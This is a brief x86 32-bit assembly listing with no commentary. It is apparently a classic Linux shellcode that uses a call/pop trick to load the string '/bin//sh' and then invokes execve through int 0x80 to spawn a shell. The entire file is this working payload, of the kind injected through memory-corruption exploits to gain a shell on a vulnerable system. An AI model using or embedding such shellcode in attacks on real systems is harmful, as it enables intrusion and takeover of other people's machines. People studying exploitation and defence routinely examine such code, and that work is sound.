.section data

.section .text
.global _start
_start:
call begin
.ascii "/bin//sh\0"


begin:
popl %ebx
xorl %eax, %eax
#movl %eax, 8(%ebx)
pushl %eax
movl %esp, %edx
pushl %ebx
movl %esp, %ecx

end:
movb $11, %al
int $0x80





